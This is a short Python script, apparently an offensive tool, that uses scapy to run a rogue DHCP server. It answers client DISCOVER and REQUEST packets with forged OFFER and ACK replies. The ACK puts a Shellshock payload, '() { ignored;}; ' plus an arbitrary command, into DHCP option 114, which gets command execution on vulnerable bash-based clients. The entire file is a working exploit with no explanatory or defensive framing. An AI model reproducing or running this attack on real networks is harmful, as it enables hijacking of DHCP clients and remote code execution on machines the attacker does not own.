from scapy.all import *
import binascii
class Root(object):
    def info_msg(self,msg):
        print(msg)
class Shocking(object):
    def __init__(self,root,iface,filter="udp and ( port 67 or 68)",cmd="echo pwned"):
        self.iface=iface
        self.filter=filter
        self.command=cmd
        if  root==None:
            self.root=Root()
        else:
            self.root=root

    def sniff(self):
        self.root.info_msg("Waiting For Connection %s on interface"%(self.iface))
        sniff(filter=self.filter,iface=self.iface,prn=self.dhcp)
    def dhcp(self,resp):
        if resp.haslayer(DHCP):
            mac_addr = resp[Ether].src
            raw_mac = binascii.unhexlify(mac_addr.replace(":", ""))
        if resp[DHCP].options[0][1] == 1:
            xid = resp[BOOTP].xid
            self.root.info_msg("[*] Got dhcp DISCOVER from: " + mac_addr + " xid: " + hex(xid))
            self.root.info_msg("[*] Sending OFFER...")
            packet = self.dhcp_offer(raw_mac, xid)
            sendp(packet,iface=self.iface)
        if resp[DHCP].options[0][1] == 3:
            xid = resp[BOOTP].xid
            self.root.info_msg("[*] Got dhcp REQUEST from: " + mac_addr + " xid: " + hex(xid))
            self.root.info_msg("[*] Sending ACK...")
            packet =self.dhcp_ack(raw_mac, xid, self.command)
            sendp(packet,iface=self.iface)
    def dhcp_offer(self,raw_mac, xid):
        packet = (Ether(src=get_if_hwaddr(self.iface), dst='ff:ff:ff:ff:ff:ff')/IP(src="192.168.2.1", dst='255.255.255.255')/UDP(sport=67, dport=68)/BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr='192.168.4.4', siaddr='192.168.4.1', xid=xid)/DHCP(options=[("message-type", "offer"),('server_id', '192.168.4.1'),('subnet_mask', '255.255.255.0'),('router', '192.168.4.5'),('lease_time', 172800),('renewal_time', 86400),('rebinding_time', 138240),"end"]))
        return packet

    def dhcp_ack(self,raw_mac, xid, command):
        packet = (Ether(src=get_if_hwaddr(self.iface), dst='ff:ff:ff:ff:ff:ff') /IP(src="192.168.4.1", dst='255.255.255.255') /UDP(sport=67, dport=68) /BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr='192.168.4.4', siaddr='192.168.4.1', xid=xid) /DHCP(options=[("message-type", "ack"),	('server_id', '192.168.4.1'),('subnet_mask', '255.255.255.0'),('router', '192.168.4.5'),('lease_time', 172800),('renewal_time', 86400),	('rebinding_time', 138240),	(114, "() { ignored;}; " + command),"end"]))
        return packet

#Shocking(root=None,iface="eth0").sniff()


